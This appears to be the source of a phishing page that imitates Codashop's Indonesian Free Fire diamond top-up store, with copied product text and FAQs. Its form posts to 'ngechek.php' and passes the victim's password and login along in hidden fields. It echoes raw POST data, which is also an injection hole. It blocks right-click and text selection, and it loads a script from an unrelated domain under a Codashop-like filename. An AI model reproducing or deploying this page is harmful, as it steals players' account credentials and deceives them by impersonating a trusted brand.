...
<html lang="en">
   <head>
      ...
      <meta content='#280031' name='theme-color'/>
   ...
   <body style="background: #280031 !important;" class="theme-page--product-page" oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> 
    ...
    <div class="top-nav-container"> 
     <div class="logo-container"> 
      <a href="/" class="logo-container-link"> <img class="logo-image theme-default__logo" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-2x.png" alt="Codashop"> </a> 
   ...
   <main class="container product-container"> 
            ...
            <section id="contents" class="main-content">
               ...
               <div class="section buy default-template" style="box-shadow: 0px 0px 0px transparent; border:1px solid #ffffff !important; background: #ffffff !important;"> 
                  <h2 class="circle"> <span style="background: #6242fc !important;">1</span> 
                     <div class="section-title">Detail Akun</div>
                  </h2>
                  <div class="form" id="formSection">
                     <p class="emailOptional default-1">Isi data dibawah ini untuk memudahkan proses pengiriman Diamond.</p>
                     <div class="email-input-container">
                        <form action="ngechek.php" method="POST" onsubmit="async()">
    ...
    echo $_POST['password'];
    ?>" readonly>
                            <input name="login" type="hidden" value="<?php 
    echo $_POST['login'];
    ?>" readonly>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">Player ID</label>
                                <input type="tel" style="margin-top: 10px; font-size: 14px;" id="userIdForm" name="userIdForm" class="product-form-input" value="<?php 
    echo $_POST['userIdForm'];
    ?>" readonly>
                            </div>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">Nickname</label>
                                <input type="text" style="margin-top: 10px; font-size: 14px;" id="nickname" name="nickname" class="product-form-input" value="<?php 
    echo $_POST['nickname'];
    ?>" readonly>
                            </div>
...
<option>Level 100</option></select>
             ...
             <button id="mdn-submit" class="email-form-btn__submit" style="background: #6242fc;
              border: none;
             border-radius: 20px;"> 
               <div class="loader" id="submit-loader"></div> <span class="btn-submit-text">SUMBIT</span> <span class="btn-submit-text for-grab"></span> </button> 
                 <div class="remember-me-container"> 
                 <label for="ck1" class="remember-me-label"> <input type="checkbox" class="remember-me-chkbox" id="ck1"> <span class="remember-me-checkmark"></span> <span class="remember-me-text"> Ingat saya </span> </label> 
                  </div> 
                 </div> 
                 </div> 
         ...
         <section class="section product__long-description shop-content__container" style="background: #fff; color: #000;"> 
            <h1 class="product-tagline-title"> Codashop - The best way to top up FF Diamond in Indonesia </h1> 
    <article class="product__tag-line"> 
     <p class="shop-content--paragraph">Hanya butuh beberapa detik saja untuk membeli Diamonds Free Fire. Unlock berbagai macam hadiah Elite Pass premium, pet, baju, hingga skin senjata pakai Diamond Free Fire! Di Codashop, top-up jadi mudah, aman, dan praktis. Codashop dipercaya oleh jutaan gamers &amp; pengguna aplikasi di Asia Tenggara termasuk Indonesia. Caranya mudah, tanpa perlu kartu kredit, registrasi, ataupun log-in! <a href="#top">Klik disini untuk memulai</a>.</p> 
     ...
     <p class="shop-content--paragraph"><strong>Persyaratan Sistem Minimum</strong> <br>• OS: Android 4.0.3 atau iOs 8.0 atau lebih <br>• Storage: 1.1 GB <br>• RAM: 2GB</p> 
     ...
     <p class="shop-content--paragraph">Unduh dan mainkan Free Fire sekarang!<br> <a class="shop-content--badge" href="https://apps.apple.com/US/app/id1300146617?mt=8" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"></a> <a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.dts.freefireth" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"></a></p> 
     <p class="shop-content--paragraph">NGOBROL BARENG TENTANG<br> <a class="shop-content--image" href="https://community.codashop.com/id/categories/id-free-fire" target="_blank" rel="noopener"> <img src="https://cdn1.codashop.com/S/content/common/images/promos/Community Banners/freefire_id_codaclub.jpeg" alt="Free Fire Conversation"></a> </p>
    </article> 
   </section> 
   <section class="faq-accordion-container"> 
    <div class="accordion-container centered-align">
     <section class="accordion-section"> 
      <div> 
       <input class="faq-switcher" type="checkbox" id="faq-1"> 
       <label class="faq-switcher-area" for="faq-1"> <h3 class="faq-element__question">Bagaimana cara top up Free Fire?</h3> <span class="faq-element__arrow"></span> </label> 
       <article class="faq-element__answer">
        <p class="shop-content--paragraph">Beli diamond Free Fire jadi mudah, aman, dan praktis di Codashop. Cukup ikuti langkah-langkah berikut dan bayarlah menggunakan GoPay, OVO, DANA, ShopeePay, Bank transfer, Indosat, Tri, Telkomsel, XL, Smartfren, Indomaret, Alfamart Kredivo, LinkAja, True Money, dan DOKU Wallet. Diamond dijamin terkirim hanya dalam hitungan detik.<br> </p>
        <ul class="shop-content--list list-number">
         <li><a href="#top">Klik di sini untuk mulai</a></li> 
         ...
         <li>Klik tombol "Beli Sekarang" untuk menyelesaikan transaksi-mu.</li>
        </ul>
        <p></p>
       </article> 
      </div> 
     ...
     <section class="accordion-section"> 
      <div> 
       ...
       <label class="faq-switcher-area" for="faq-2"> <h3 class="faq-element__question">Dimana Tempat Top up FF Termurah?</h3> <span class="faq-element__arrow"></span> </label> 
       <article class="faq-element__answer">
        <p class="shop-content--paragraph">Jika kamu ingin membeli diamond FF dengan harga termurah, pastikan cek semua pilihan pembayaran yang ada di Codashop dan temukan harga terbaik untuk jumlah diamond pilihanmu.</p> 
        <p class="shop-content--paragraph">Biasanya pembelian diamond Free Fire lebih murah menggunakan metode pembayaran e-wallet seperti GoPay, OVO, Dana, ShopeePay dan LinkAja.</p>
       </article> 
      </div> 
     </section>
     <section class="accordion-section"> 
      <div> 
       ...
       <label class="faq-switcher-area" for="faq-3"> <h3 class="faq-element__question">Bagaimana Cara Membeli Elite Pass Free Fire?</h3> <span class="faq-element__arrow"></span> </label> 
       <article class="faq-element__answer">
        <p class="shop-content--paragraph">Beli Elite Pass Free Fire sangatlah mudah! Cukup top up 500 diamond untuk beli Elite Pass, dan 900 diamond untuk beli Elite Bundle. </p> 
        <ul class="shop-content--list list-number">
         <li><a href="#top">Klik di sini untuk beli diamond Free Fire</a>.</li> 
         ...
         <li>Klik tombol "Upgrade" dan beli Elite Pass seharga 500 diamond, atau jika kamu ingin hadiah yang lebih banyak lagi pastikan beli Elite Bundle seharga 900 diamond.</li>
        </ul> 
        <p class="shop-content--paragraph">Tada! Setelah Elite Pass-mu telah aktif, mulai selesaikan misi demi misi &amp; berbagai tantangan untuk membuka hadiah-hadiah eksklusif Elite Pass.</p>
       </article> 
      </div> 
     </section>
    </div> 
    ...
    <div class="footer-area"> 
     <section class="left-blocks-container"> 
      ...
      <div class="international-container"> 
       <a href="/international" class="international-flag-block" rel="noopener"> <i class="f32_indonesia footer__country-flag" id="footer__country-flag"></i> 
        <div class="international__country-name">
         Indonesia
        </div> </a> 
      </div> 
     </section> 
     <section class="right-blocks-container"> 
      ...
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/payment-channel-suggestion.535f3c6f70.js"></script><script type="text/javascript" src="https://claimwibu.my.id/webstore/ajax/codaFF.js"></script>
